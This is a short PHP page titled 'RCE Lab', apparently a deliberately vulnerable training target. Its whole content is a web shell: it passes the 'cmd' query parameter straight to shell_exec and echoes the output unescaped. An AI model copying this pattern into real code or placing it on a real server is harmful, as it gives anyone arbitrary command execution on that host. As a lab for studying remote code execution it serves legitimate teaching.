<?php
    if (isset($_GET['cmd'])) {
        $cmd = $_GET['cmd'];
        $output = shell_exec($cmd);
    }
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>RCE Lab</title>
</head>
<body>
    <h1>RCE Lab</h1>
    <form method="GET" action="">
        <label for="cmd">Enter a command:</label>
        <input type="text" id="cmd" name="cmd">
        <button type="submit">Execute</button>
    </form>
    <?php if (isset($output)): ?>
        <h2>Output:</h2>
        <pre><?php echo $output; ?></pre>
    <?php endif; ?>
</body>
</html>
